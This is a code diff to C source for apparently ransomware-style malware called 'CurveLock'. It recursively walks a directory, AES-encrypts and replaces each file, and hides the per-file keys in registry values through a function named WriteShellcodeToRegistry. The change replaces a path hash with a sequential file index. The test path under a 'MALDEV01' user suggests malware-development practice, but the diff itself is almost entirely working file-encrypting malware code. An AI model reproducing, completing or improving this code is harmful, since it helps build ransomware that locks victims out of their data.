@@ -170,7 +170,7 @@ BOOL Aes256EncryptBuffer(BYTE* pbKey, BYTE* pbIV, BYTE* pbData, DWORD cbData, BY
     return TRUE;
 }
 
-BOOL ReplaceWithEncryptedFile(IN LPWSTR szFilePathToEncrypt) {
+BOOL ReplaceWithEncryptedFile(IN LPWSTR szFilePathToEncrypt, int fileIndex) {
     HANDLE                  hSourceFile = INVALID_HANDLE_VALUE,
         hDestinationFile = INVALID_HANDLE_VALUE;
     ULONG_PTR               uFileBufferAddr = NULL,
@@ -312,9 +312,9 @@ BOOL ReplaceWithEncryptedFile(IN LPWSTR szFilePathToEncrypt) {
 
     BCryptCloseAlgorithmProvider(hAlg, 0);
 
-    // Generate a unique registry key name based on the file path
+    // Generate a unique registry key name based on the file index
     char regKeyName[MAX_PATH];
-    _snprintf_s(regKeyName, sizeof(regKeyName), _TRUNCATE, "CurveLock_%08X", HashString(szFilePathToEncrypt));
+    _snprintf_s(regKeyName, sizeof(regKeyName), _TRUNCATE, "CurveLock_%d", fileIndex);
 
     // Save the generated AES key to the registry
     if (!WriteShellcodeToRegistry(pbKey, AES_KEY_SIZE, regKeyName)) {
@@ -363,7 +363,7 @@ _END_OF_FUNC:
     return bResult;
 }
 
-BOOL EncryptFilesInGivenDir(IN LPCWSTR szDirectoryPath) {
+BOOL EncryptFilesInGivenDir(IN LPCWSTR szDirectoryPath, int* fileIndex) {
     if (!szDirectoryPath)
         return FALSE;
 
@@ -388,12 +388,19 @@ BOOL EncryptFilesInGivenDir(IN LPCWSTR szDirectoryPath) {
 
         if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
             printf("[*] Directory: %ws\n", szFullStrPath);
-            if (!EncryptFilesInGivenDir(szFullStrPath))
+            if (!EncryptFilesInGivenDir(szFullStrPath, fileIndex))
                 goto _END_OF_FUNC;
         }
 
-        if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
-            printf("\t> Encrypting File: %ws ... %s \n", szFullStrPath, ReplaceWithEncryptedFile(szFullStrPath) ? "[+] DONE" : "[-] Failed");
+        if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+            printf("\t> Encrypting File: %ws ... ", szFullStrPath);
+            if (ReplaceWithEncryptedFile(szFullStrPath, (*fileIndex)++)) {
+                printf("[+] DONE\n");
+            }
+            else {
+                printf("[-] Failed\n");
+            }
+        }
 
     } while (FindNextFileW(hFind, &FindFileData));
 
@@ -405,16 +412,9 @@ _END_OF_FUNC:
     return bResult;
 }
 
-int HashString(LPCWSTR str) {
-    int hash = 0;
-    while (*str) {
-        hash = (hash * 31) + *str++;
-    }
-    return hash;
-}
-
 int main() {
     WCHAR DirectoryPath[MAX_PATH] = L"C:\\Users\\MALDEV01\\Desktop\\TestFolder";
-    EncryptFilesInGivenDir(DirectoryPath);
+    int fileIndex = 1;
+    EncryptFilesInGivenDir(DirectoryPath, &fileIndex);
     return 0;
 }
